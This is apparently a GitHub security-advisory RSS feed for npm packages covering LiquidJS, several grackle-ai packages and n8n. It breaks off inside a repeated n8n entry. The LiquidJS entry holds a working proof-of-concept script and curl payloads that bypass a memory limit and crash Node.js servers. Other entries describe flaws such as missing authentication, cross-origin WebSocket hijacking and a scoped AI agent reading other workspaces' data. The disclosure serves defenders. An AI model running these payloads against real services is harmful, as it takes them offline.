<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://xlordz.github.io/github-advisory-database-rss/npm.rss</id>
    <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
    <updated>2026-03-25T17:42:35.921Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
    <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[liquidjs] LiquidJS: memoryLimit Bypass through Negative Range Values Leads to Process Crash]]></title>
        <id>https://github.com/advisories/GHSA-9r5m-9576-7f6x</id>
        <link href="https://github.com/advisories/GHSA-9r5m-9576-7f6x"/>
        <updated>2026-03-25T17:40:53.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>LiquidJS's <code>memoryLimit</code> security mechanism can be completely bypassed by using reverse range expressions (e.g., <code>(100000000..1)</code>), allowing an attacker to allocate unlimited memory. Combined with a string flattening operation (e.g., <code>replace</code> filter), this causes a <strong>V8 Fatal error that crashes the Node.js process</strong>, resulting in complete denial of service from a single HTTP request.</p>
<h3 id="details">Details</h3>
<p>When LiquidJS evaluates a range token <code>(low..high)</code>, it calls <code>ctx.memoryLimit.use(high - low + 1)</code> in <code>src/render/expression.ts:70</code> to account for memory usage. However, for reverse ranges where <code>low &gt; high</code> (e.g., <code>(100000000..1)</code>), this computation yields a negative value (<code>1 - 100000000 + 1 = -99999998</code>).</p>
<p>The <code>Limiter.use()</code> method in <code>src/util/limiter.ts:11-14</code> does not validate that the <code>count</code> parameter is non-negative. It simply adds <code>count</code> to <code>this.base</code>, causing the internal counter to go negative. Once the counter is sufficiently negative, subsequent legitimate memory allocations that would normally exceed the configured <code>memoryLimit</code> pass the <code>base + count &lt;= limit</code> assertion.</p>
<pre><code class="language-typescript">// src/render/expression.ts:67-72
function * evalRangeToken (token: RangeToken, ctx: Context) {
  const low: number = yield evalToken(token.lhs, ctx)
  const high: number = yield evalToken(token.rhs, ctx)
  ctx.memoryLimit.use(high - low + 1)  // high=1, low=1e8 → use(-99999999)
  return range(+low, +high + 1)
}

// src/util/limiter.ts:11-14
use (count: number) {
  count = +count || 0
  assert(this.base + count &lt;= this.limit, this.message)
  this.base += count  // base becomes negative
}
</code></pre>
<h4 id="escalation-to-process-crash-via-cons-string-flattening">Escalation to Process Crash via Cons-String Flattening</h4>
<p>V8 optimizes string concatenation (<code>append</code> filter) by creating a cons-string (a linked tree of string fragments) rather than copying data. This means <code>{% assign s = s | append: s %}</code> repeated 27 times creates a 134MB logical string that consumes only kilobytes of actual memory.</p>
<p>However, when a filter that requires the full string buffer is applied — such as <code>replace</code> — V8 must "flatten" the cons-string into a contiguous memory buffer. For a 134MB cons-string, this requires allocating ~268MB (UTF-16) in a single operation. This triggers a <strong>V8 C++ level Fatal error</strong> (<code>Fatal JavaScript invalid size error 134217729</code>) that:</p>
<ul>
<li><strong>Cannot be caught</strong> by JavaScript <code>try-catch</code> or <code>process.on('uncaughtException')</code></li>
<li><strong>Immediately terminates</strong> the Node.js process (exit code 133 / SIGTRAP)</li>
<li><strong>Crashes the entire service</strong>, not just the attacking connection</li>
</ul>
<p>The complete attack chain:</p>
<ol>
<li>Insert 5 reverse ranges <code>{% for x in (100000000..1) %}{% endfor %}</code> → memory budget becomes -500M</li>
<li>Build a 134MB cons-string via 27 iterations of <code>{% assign s = s | append: s %}</code>  → negligible actual memory</li>
<li>Apply <code>{% assign flat = s | replace: 'A', 'B' %}</code> → V8 attempts to flatten → <strong>Fatal error → process crash</strong></li>
</ol>
<p>The attacker payload is ~400 bytes. The server process dies instantly. Express error handlers, domain handlers, and uncaughtException handlers are all bypassed.</p>
<h3 id="poc">PoC</h3>
<ul>
<li>LiquidJS &lt;= 10.24.x with <code>memoryLimit</code> option enabled</li>
<li>Attacker can control Liquid template source code</li>
</ul>
<p>Save the following as <code>poc_memorylimit_bypass.js</code> and run with <code>node poc_memorylimit_bypass.js</code>:</p>
<pre><code class="language-javascript">const { Liquid } = require('liquidjs');

(async () =&gt; {
  const engine = new Liquid({ memoryLimit: 1e8 }); // 100MB limit

  // Step 1 — Baseline: memoryLimit blocks large allocation
  console.log('=== Step 1: Baseline (should fail) ===');
  try {
    const baseline = "{% assign s = 'A' %}{% for i in (1..27) %}{% assign s = s | append: s %}{% endfor %}{{ s | size }}";
    const result = await engine.parseAndRender(baseline);
    console.log('Result:', result); // Should not reach here
  } catch (e) {
    console.log('Blocked:', e.message); // "memory alloc limit exceeded"
  }

  // Step 2 — Bypass: reverse ranges drive counter negative
  console.log('\n=== Step 2: Bypass (should succeed) ===');
  try {
    const bypass = "{% for x in (100000000..1) %}{% endfor %}{% for x in (100000000..1) %}{% endfor %}{% assign s = 'A' %}{% for i in (1..27) %}{% assign s = s | append: s %}{% endfor %}{{ s | size }}";
    const result = await engine.parseAndRender(bypass);
    console.log('Result:', result); // "134217728" — 134MB allocated despite 100MB limit
  } catch (e) {
    console.log('Error:', e.message);
  }

  // Step 3 — Process crash: cons-string flattening via replace
  console.log('\n=== Step 3: Process crash (node process will terminate) ===');
  console.log('If the process exits here with code 133/SIGTRAP, the crash is confirmed.');
  try {
    const crash = [
      ...Array(5).fill('{% for x in (100000000..1) %}{% endfor %}'),
      "{% assign s = 'A' %}{% for i in (1..27) %}{% assign s = s | append: s %}{% endfor %}",
      "{% assign flat = s | replace: 'A', 'B' %}{{ flat | size }}"
    ].join('');
    const result = await engine.parseAndRender(crash);
    console.log('Result:', result); // Should not reach here
  } catch (e) {
    console.log('Caught error:', e.message); // V8 Fatal error is NOT catchable
  }
})();
</code></pre>
<p><strong>Expected output:</strong></p>
<pre><code>=== Step 1: Baseline (should fail) ===
Blocked: memory alloc limit exceeded, line:1, col:43

=== Step 2: Bypass (should succeed) ===
Result: 134217728

=== Step 3: Process crash (node process will terminate) ===
If the process exits here with code 133/SIGTRAP, the crash is confirmed.
#
# Fatal error in , line 0
# Fatal JavaScript invalid size error 134217729
#
</code></pre>
<p>The process terminates at Step 3 with exit code 133 (SIGTRAP). The V8 Fatal error occurs at the C++ level and <strong>cannot be caught</strong> by <code>try-catch</code>, <code>process.on('uncaughtException')</code>, or any JavaScript error handler.</p>
<h4 id="http-reproduction-for-applications-that-accept-user-templates">HTTP Reproduction (for applications that accept user templates)</h4>
<p>If the application exposes an endpoint that renders user-supplied Liquid templates with <code>memoryLimit</code> configured (e.g., CMS preview, newsletter editor, etc.):</p>
<pre><code class="language-bash"># Step 1 — Baseline: should return "memory alloc limit exceeded"
curl -s -X POST http://&lt;app&gt;/render \
  -H "Content-Type: application/json" \
  -d '{"template": "{% assign s = '\''A'\'' %}{% for i in (1..27) %}{% assign s = s | append: s %}{% endfor %}{{ s | size }}"}'

# Step 2 — Bypass: should return "134217728" (134MB allocated despite 100MB limit)
curl -s -X POST http://&lt;app&gt;/render \
  -H "Content-Type: application/json" \
  -d '{"template": "{% for x in (100000000..1) %}{% endfor %}{% for x in (100000000..1) %}{% endfor %}{% assign s = '\''A'\'' %}{% for i in (1..27) %}{% assign s = s | append: s %}{% endfor %}{{ s | size }}"}'

# Step 3 — Process crash: connection drops, server process terminates
curl -s -X POST http://&lt;app&gt;/render \
  -H "Content-Type: application/json" \
  -d '{"template": "{% for x in (100000000..1) %}{% endfor %}{% for x in (100000000..1) %}{% endfor %}{% for x in (100000000..1) %}{% endfor %}{% for x in (100000000..1) %}{% endfor %}{% for x in (100000000..1) %}{% endfor %}{% assign s = '\''A'\'' %}{% for i in (1..27) %}{% assign s = s | append: s %}{% endfor %}{% assign flat = s | replace: '\''A'\'', '\''B'\'' %}{{ flat | size }}"}'
</code></pre>
<p>Replace <code>http://&lt;app&gt;/render</code> with the actual template rendering endpoint. The payload is pure Liquid syntax and works regardless of the HTTP framework or endpoint structure.</p>
<h3 id="impact">Impact</h3>
<p>An attacker who can control template content (common in CMS, email template editors, and SaaS platforms using LiquidJS) can bypass the <code>memoryLimit</code> protection entirely and crash the Node.js process:</p>
<ul>
<li><strong>Complete bypass of the <code>memoryLimit</code> security mechanism</strong>: The explicitly configured memory limit becomes ineffective.</li>
<li><strong>Process crash from a single HTTP request</strong>: V8 Fatal error terminates the entire Node.js process, not just the attacking request. This is not a catchable JavaScript exception.</li>
<li><strong>Service-wide denial of service</strong>: All in-flight requests are terminated. Manual restart or container restart policy is required to recover.</li>
<li><strong>False sense of security</strong>: Administrators who configured <code>memoryLimit</code> believe their service is protected when it is not.</li>
<li><strong>Container restart policy does not mitigate</strong>: Even with Docker <code>restart: always</code> or Kubernetes liveness probes, repeated crash payloads can keep the service in a perpetual restart loop. Each restart takes several seconds, during which all in-flight requests are lost and the service is unavailable.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/harttle/liquidjs/security/advisories/GHSA-9r5m-9576-7f6x">https://github.com/harttle/liquidjs/security/advisories/GHSA-9r5m-9576-7f6x</a></li>
<li><a href="https://github.com/harttle/liquidjs/commit/95ddefc056a11a44d9e753fd47a39db2c241e578">https://github.com/harttle/liquidjs/commit/95ddefc056a11a44d9e753fd47a39db2c241e578</a></li>
<li><a href="https://github.com/advisories/GHSA-9r5m-9576-7f6x">https://github.com/advisories/GHSA-9r5m-9576-7f6x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9r5m-9576-7f6x</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-25T17:40:53.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@grackle-ai/server] @grackle-ai/server JSON.parse lacks try-catch logic in its gRPC Service AdapterConfig Handling]]></title>
        <id>https://github.com/advisories/GHSA-8g29-8xwr-qmhr</id>
        <link href="https://github.com/advisories/GHSA-8g29-8xwr-qmhr"/>
        <updated>2026-03-25T17:33:03.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p><code>JSON.parse(env.adapterConfig)</code> is called without error handling in three locations within the gRPC service. While the data originates from the server's own SQLite database and should always be valid JSON, database corruption, migration errors, or unexpected state could cause an unhandled exception that crashes the gRPC handler.</p>
<p>Additionally, the parsed result is cast as <code>Record&lt;string, unknown&gt;</code> and passed to adapter methods without property validation, creating a theoretical prototype pollution surface if the database is compromised.</p>
<p><strong>Affected code:</strong></p>
<ul>
<li><code>packages/server/src/grpc-service.ts:415</code> — <code>reconnectOrProvision</code> handler</li>
<li><code>packages/server/src/grpc-service.ts:482</code> — <code>stopEnvironment</code> handler</li>
<li><code>packages/server/src/grpc-service.ts:498</code> — <code>destroyEnvironment</code> handler</li>
</ul>
<h3 id="patches">Patches</h3>
<p><strong>Fix:</strong> Wrap in try-catch and return a meaningful gRPC error:</p>
<pre><code class="language-typescript">let config: Record&lt;string, unknown&gt;;
try {
  config = JSON.parse(env.adapterConfig) as Record&lt;string, unknown&gt;;
} catch {
  throw new ConnectError("Invalid adapter configuration", Code.Internal);
}
</code></pre>
<h3 id="workarounds">Workarounds</h3>
<p>Ensure database integrity. Back up the SQLite database regularly.</p>
<h3 id="resources">Resources</h3>
<ul>
<li>CWE-754: Improper Check for Unusual or Exceptional Conditions</li>
<li>File: <code>packages/server/src/grpc-service.ts</code></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nick-pape/grackle/security/advisories/GHSA-8g29-8xwr-qmhr">https://github.com/nick-pape/grackle/security/advisories/GHSA-8g29-8xwr-qmhr</a></li>
<li><a href="https://github.com/advisories/GHSA-8g29-8xwr-qmhr">https://github.com/advisories/GHSA-8g29-8xwr-qmhr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8g29-8xwr-qmhr</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-03-25T17:33:01.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@grackle-ai/server] @grackle-ai/server has a Missing Secure Flag on Session Cookie]]></title>
        <id>https://github.com/advisories/GHSA-5j35-xr4g-vwf4</id>
        <link href="https://github.com/advisories/GHSA-5j35-xr4g-vwf4"/>
        <updated>2026-03-25T17:32:40.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The session cookie is set with <code>HttpOnly; SameSite=Lax; Path=/</code> but does not include the <code>Secure</code> flag. This means the cookie will be sent over plain HTTP connections.</p>
<p>Since the server binds to <code>127.0.0.1</code> by default and uses HTTP (not HTTPS), this is acceptable for localhost use. However, when <code>--allow-network</code> is used to bind to <code>0.0.0.0</code>, cookies could be transmitted over insecure network connections and intercepted by an attacker.</p>
<p><strong>Affected code:</strong></p>
<ul>
<li><code>packages/server/src/session.ts:76</code> — cookie string lacks <code>; Secure</code> attribute</li>
</ul>
<h3 id="patches">Patches</h3>
<p>0.70.5</p>
<p><strong>Fix:</strong> Conditionally add <code>; Secure</code> when served over HTTPS or when <code>--allow-network</code> is enabled:</p>
<pre><code class="language-typescript">const securePart = isHttps ? "; Secure" : "";
return `${SESSION_COOKIE_NAME}=${cookieValue}; HttpOnly; SameSite=Lax; Path=/${securePart}; Max-Age=${maxAge}`;
</code></pre>
<h3 id="workarounds">Workarounds</h3>
<p>Do not use <code>--allow-network</code> over untrusted networks without a TLS-terminating reverse proxy.</p>
<h3 id="resources">Resources</h3>
<ul>
<li>OWASP: Secure Cookie Attribute</li>
<li>File: <code>packages/server/src/session.ts</code></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nick-pape/grackle/security/advisories/GHSA-5j35-xr4g-vwf4">https://github.com/nick-pape/grackle/security/advisories/GHSA-5j35-xr4g-vwf4</a></li>
<li><a href="https://github.com/advisories/GHSA-5j35-xr4g-vwf4">https://github.com/advisories/GHSA-5j35-xr4g-vwf4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5j35-xr4g-vwf4</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-03-25T17:32:39.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@grackle-ai/server] @grackle-ai/server has Missing Content-Security-Policy and X-Frame-Options Headers]]></title>
        <id>https://github.com/advisories/GHSA-3mjm-x6gw-2x42</id>
        <link href="https://github.com/advisories/GHSA-3mjm-x6gw-2x42"/>
        <updated>2026-03-25T17:32:05.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The HTTP server does not set <code>Content-Security-Policy</code>, <code>X-Frame-Options</code>, or <code>X-Content-Type-Options</code> headers on any response. This reduces defense-in-depth against XSS, clickjacking, and MIME-sniffing attacks.</p>
<p>While the current XSS attack surface is small (React-markdown is configured safely, no <code>dangerouslySetInnerHTML</code>, Vite does not generate source maps), the absence of these headers means any future XSS vulnerability would have no secondary defense layer.</p>
<p><strong>Affected code:</strong></p>
<ul>
<li><code>packages/server/src/index.ts</code> — all <code>res.writeHead()</code> calls only set <code>Content-Type</code>, with no security headers</li>
</ul>
<h3 id="patches">Patches</h3>
<p>0.70.4</p>
<p><strong>Fix:</strong> Add security headers to all HTML/API responses:</p>
<pre><code class="language-typescript">res.writeHead(200, {
  "Content-Type": contentType,
  "Content-Security-Policy": "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:",
  "X-Frame-Options": "DENY",
  "X-Content-Type-Options": "nosniff"
});
</code></pre>
<h3 id="workarounds">Workarounds</h3>
<p>Use a reverse proxy (nginx, Caddy) in front of the Grackle server to inject security headers.</p>
<h3 id="references">References</h3>
<ul>
<li>CWE-693: Protection Mechanism Failure</li>
<li>OWASP: HTTP Security Response Headers</li>
<li>File: <code>packages/server/src/index.ts</code></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/nick-pape/grackle/security/advisories/GHSA-3mjm-x6gw-2x42">https://github.com/nick-pape/grackle/security/advisories/GHSA-3mjm-x6gw-2x42</a></li>
<li><a href="https://github.com/advisories/GHSA-3mjm-x6gw-2x42">https://github.com/advisories/GHSA-3mjm-x6gw-2x42</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3mjm-x6gw-2x42</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-25T17:32:04.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@grackle-ai/powerline] @grackle-ai/powerline Runs Without Authentication by Default]]></title>
        <id>https://github.com/advisories/GHSA-xq7h-vwjp-5vrh</id>
        <link href="https://github.com/advisories/GHSA-xq7h-vwjp-5vrh"/>
        <updated>2026-03-25T17:30:47.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>When <code>--token</code> is not provided and <code>GRACKLE_POWERLINE_TOKEN</code> is not set, the PowerLine gRPC server runs with <strong>zero authentication</strong>. A warning is logged (<code>"NO AUTH (development only)"</code>) but nothing prevents deployment in this state. Any client that can reach the PowerLine port can spawn agent sessions, access credential tokens, and execute code.</p>
<p>The default binding is <code>127.0.0.1</code> (loopback only), which limits exposure to the local machine. However, if PowerLine is accidentally exposed on a network (e.g., in a container or via port forwarding), the impact is critical.</p>
<p><strong>Affected code:</strong></p>
<ul>
<li><code>packages/powerline/src/index.ts:46</code> — token defaults to empty string</li>
<li><code>packages/powerline/src/index.ts:63-76</code> — auth interceptor is only added when token is truthy</li>
</ul>
<h3 id="patches">Patches</h3>
<p>0.70.1</p>
<p><strong>Fix:</strong> Require an explicit <code>--no-auth</code> flag to run without authentication, rather than defaulting to no auth when the token is empty. Throw an error if starting without a token and without <code>--no-auth</code>.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Always provide <code>--token</code> or set <code>GRACKLE_POWERLINE_TOKEN</code> when starting PowerLine. The Grackle server does this automatically when managing PowerLine lifecycle.</p>
<h3 id="resources">Resources</h3>
<ul>
<li>CWE-306: Missing Authentication for Critical Function</li>
<li>File: <code>packages/powerline/src/index.ts</code></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nick-pape/grackle/security/advisories/GHSA-xq7h-vwjp-5vrh">https://github.com/nick-pape/grackle/security/advisories/GHSA-xq7h-vwjp-5vrh</a></li>
<li><a href="https://github.com/advisories/GHSA-xq7h-vwjp-5vrh">https://github.com/advisories/GHSA-xq7h-vwjp-5vrh</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xq7h-vwjp-5vrh</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-25T17:30:46.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@grackle-ai/server] @grackle-ai/server has Missing WebSocket Origin Header Validation]]></title>
        <id>https://github.com/advisories/GHSA-w3hv-x4fp-6h6j</id>
        <link href="https://github.com/advisories/GHSA-w3hv-x4fp-6h6j"/>
        <updated>2026-03-25T17:28:07.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The WebSocket upgrade handler in the server validates authentication (API key token or session cookie) but does not check the <code>Origin</code> header. A malicious webpage on a different origin could initiate a WebSocket connection to <code>ws://localhost:3000/ws</code> if it can leverage the user's session cookie (which is <code>SameSite=Lax</code>, allowing top-level navigations).</p>
<p>This enables <strong>cross-origin WebSocket hijacking</strong> — if a user visits a malicious site while a Grackle session is active, the attacker's page could open a WebSocket and subscribe to real-time events (session output, task updates, environment state).</p>
<p><strong>Affected code:</strong></p>
<ul>
<li><code>packages/server/src/ws-bridge.ts:80-91</code> — connection handler accepts WebSocket upgrades without checking <code>req.headers.origin</code></li>
</ul>
<h3 id="patches">Patches</h3>
<p><strong>Fix:</strong> Validate <code>req.headers.origin</code> against an allowlist before accepting connections:</p>
<pre><code class="language-typescript">const origin = req.headers.origin || "";
if (origin &amp;&amp; !origin.includes("localhost") &amp;&amp; !origin.includes("127.0.0.1")) {
  ws.close(4003, "Invalid origin");
  return;
}
</code></pre>
<h3 id="workarounds">Workarounds</h3>
<p>Ensure the Grackle server is only accessible on <code>127.0.0.1</code> (the default). Do not use <code>--allow-network</code> in untrusted network environments.</p>
<h3 id="resources">Resources</h3>
<ul>
<li>CWE-346: Origin Validation Error</li>
<li>File: <code>packages/server/src/ws-bridge.ts</code></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nick-pape/grackle/security/advisories/GHSA-w3hv-x4fp-6h6j">https://github.com/nick-pape/grackle/security/advisories/GHSA-w3hv-x4fp-6h6j</a></li>
<li><a href="https://github.com/advisories/GHSA-w3hv-x4fp-6h6j">https://github.com/advisories/GHSA-w3hv-x4fp-6h6j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w3hv-x4fp-6h6j</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-25T17:27:48.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@grackle-ai/mcp] @grackle-ai/mcp has a workspace authorization bypass in its knowledge_search MCP tool]]></title>
        <id>https://github.com/advisories/GHSA-647h-p824-99w7</id>
        <link href="https://github.com/advisories/GHSA-647h-p824-99w7"/>
        <updated>2026-03-25T17:23:12.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The <code>knowledge_search</code> and <code>knowledge_get_node</code> MCP tools are included in <code>SCOPED_TOOLS</code> (visible to scoped agents) but their handlers do not receive <code>authContext</code> and do not enforce workspace scoping. A scoped agent in Workspace A can supply an arbitrary <code>workspaceId</code> parameter to search or retrieve knowledge graph nodes from Workspace B, bypassing workspace isolation boundaries.</p>
<p>This is a <strong>cross-workspace data leakage</strong> vulnerability affecting any deployment where multiple workspaces contain sensitive knowledge graph data and scoped agents are used.</p>
<p><strong>Affected code:</strong></p>
<ul>
<li><code>packages/mcp/src/tools/knowledge.ts:146-169</code> (knowledge_search handler)</li>
<li><code>packages/mcp/src/tools/knowledge.ts:244-283</code> (knowledge_get_node handler)</li>
<li><code>packages/mcp/src/tool-scoping.ts:11</code> (both tools listed in SCOPED_TOOLS)</li>
</ul>
<p><strong>Contrast with correct implementation:</strong> <code>knowledge_create_node</code> (same file, lines 334-357) properly receives <code>authContext</code> and overrides the user-supplied <code>workspaceId</code> for scoped callers.</p>
<h3 id="design-note">Design Note</h3>
<p>Cross-workspace knowledge sharing is a legitimate future feature — agents working across different repos may need to collaborate and share knowledge. However, this access should be <strong>opt-in with explicit grants</strong>, not an implicit bypass. The immediate fix locks scoped agents to their own workspace. A future design could introduce:</p>
<ul>
<li>Workspace-level "share knowledge with" settings</li>
<li>A <code>cross_workspace</code> scope on scoped tokens</li>
<li>Explicit <code>workspaceIds</code> (plural) in the auth context</li>
</ul>
<h3 id="patches">Patches</h3>
<p><strong>Fix:</strong> Add <code>authContext</code> parameter to <code>knowledge_search</code> and <code>knowledge_get_node</code> handlers and enforce workspace scoping, matching the pattern in <code>knowledge_create_node</code>:</p>
<pre><code class="language-typescript">const resolvedWorkspaceId =
  authContext?.type === "scoped"
    ? authContext.workspaceId ?? ""
    : workspaceId ?? "";
</code></pre>
<p>When cross-workspace collaboration is designed, this check can be relaxed intentionally with proper access controls.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Do not use scoped agent tokens in multi-workspace deployments until patched. Alternatively, remove <code>knowledge_search</code> and <code>knowledge_get_node</code> from the <code>SCOPED_TOOLS</code> set in <code>tool-scoping.ts</code>.</p>
<h3 id="references">References</h3>
<ul>
<li>CWE-284: Improper Access Control</li>
<li>File: <code>packages/mcp/src/tools/knowledge.ts</code></li>
<li>File: <code>packages/mcp/src/tool-scoping.ts</code></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/nick-pape/grackle/security/advisories/GHSA-647h-p824-99w7">https://github.com/nick-pape/grackle/security/advisories/GHSA-647h-p824-99w7</a></li>
<li><a href="https://github.com/advisories/GHSA-647h-p824-99w7">https://github.com/advisories/GHSA-647h-p824-99w7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-647h-p824-99w7</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-25T17:23:11.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@grackle-ai/server] @grackle-ai/server: Unescaped Error String in renderPairingPage() HTML Template]]></title>
        <id>https://github.com/advisories/GHSA-7q9x-8g6p-3x75</id>
        <link href="https://github.com/advisories/GHSA-7q9x-8g6p-3x75"/>
        <updated>2026-03-25T17:15:41.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The <code>renderPairingPage()</code> function embeds the <code>error</code> parameter directly into HTML without escaping:</p>
<pre><code class="language-typescript">const errorHtml = error ? `&lt;p style="color:#e74c3c"&gt;${error}&lt;/p&gt;` : "";
</code></pre>
<p>All current call sites pass hardcoded strings, so this is <strong>not exploitable today</strong>. However, the function is architecturally fragile — if a future code change passes user-controlled or dynamic content into the error parameter, it would create an XSS vulnerability.</p>
<p>The <code>renderAuthorizePage()</code> function in the same file correctly uses <code>escapeHtml()</code> for dynamic content, making this an inconsistency.</p>
<p><strong>Affected code:</strong></p>
<ul>
<li><code>packages/server/src/index.ts:64-89</code> — <code>renderPairingPage()</code> with unescaped error interpolation</li>
<li>Compare: <code>packages/server/src/index.ts:130</code> — <code>renderAuthorizePage()</code> correctly uses <code>escapeHtml()</code></li>
</ul>
<h3 id="patches">Patches</h3>
<p>v0.70.1</p>
<p><strong>Fix:</strong> Apply <code>escapeHtml()</code> to the error parameter:</p>
<pre><code class="language-typescript">const errorHtml = error ? `&lt;p style="color:#e74c3c"&gt;${escapeHtml(error)}&lt;/p&gt;` : "";
</code></pre>
<h3 id="workarounds">Workarounds</h3>
<p>No workaround needed — all current callers pass hardcoded strings.</p>
<h3 id="resources">Resources</h3>
<ul>
<li>CWE-79: Improper Neutralization of Input During Web Page Generation</li>
<li>File: <code>packages/server/src/index.ts</code></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nick-pape/grackle/security/advisories/GHSA-7q9x-8g6p-3x75">https://github.com/nick-pape/grackle/security/advisories/GHSA-7q9x-8g6p-3x75</a></li>
<li><a href="https://github.com/advisories/GHSA-7q9x-8g6p-3x75">https://github.com/advisories/GHSA-7q9x-8g6p-3x75</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7q9x-8g6p-3x75</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-03-25T17:15:40.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[n8n] n8n has In-Process Memory Disclosure in its Task Runner]]></title>
        <id>https://github.com/advisories/GHSA-xvh5-5qg4-x9qp</id>
        <link href="https://github.com/advisories/GHSA-xvh5-5qg4-x9qp"/>
        <updated>2026-03-25T17:00:30.000Z</updated>
        <content type="html"><![CDATA[<h2 id="impact">Impact</h2>
<p>An authenticated user with permission to create or modify workflows could use the JavaScript Task Runner to allocate uninitialized memory buffers. Uninitialized buffers may contain residual data from the same Node.js process — including data from prior requests, tasks, secrets, or tokens — resulting in information disclosure of sensitive in-process data.</p>
<ul>
<li>Task Runners must be enabled using <code>N8N_RUNNERS_ENABLED=true</code>.</li>
<li>In external runner mode, the impact is limited to data within the external runner process.</li>
</ul>
<h2 id="patches">Patches</h2>
<p>The issue has been fixed in n8n versions &gt;= 1.123.22, &gt;= 2.10.1 , and &gt;= 2.9.3. Users should upgrade to this version or later to remediate the vulnerability.</p>
<h2 id="workarounds">Workarounds</h2>
<p>If upgrading is not immediately possible, administrators should consider the following temporary mitigations:</p>
<ul>
<li>Limit workflow creation and editing permissions to fully trusted users only.</li>
<li>Use external runner mode (<code>N8N_RUNNERS_MODE=external</code>) to isolate the runner process.</li>
</ul>
<p>These workarounds do not fully remediate the risk and should only be used as short-term mitigation measures.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/n8n-io/n8n/security/advisories/GHSA-xvh5-5qg4-x9qp">https://github.com/n8n-io/n8n/security/advisories/GHSA-xvh5-5qg4-x9qp</a></li>
<li><a href="https://docs.n8n.io/hosting/configuration/task-runners">https://docs.n8n.io/hosting/configuration/task-runners</a></li>
<li><a href="https://docs.n8n.io/hosting/securing/blocking-nodes">https://docs.n8n.io/hosting/securing/blocking-nodes</a></li>
<li><a href="https://github.com/advisories/GHSA-xvh5-5qg4-x9qp">https://github.com/advisories/GHSA-xvh5-5qg4-x9qp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xvh5-5qg4-x9qp</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-25T17:00:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[n8n] n8n has In-Process Memory Disclosure in its Task Runner]]></title>
        <id>https://github.com/advisories/GHSA-xvh5-5qg4-x9qp</id>
        <link href="https://github.com/advisories/GHSA-xvh5-5qg4-x9qp"/>
        <updated>2026-03-25T17:00:30.000Z</updated>
        <content type="html"><![CDATA[<h2 id="impact">Impact</h2>
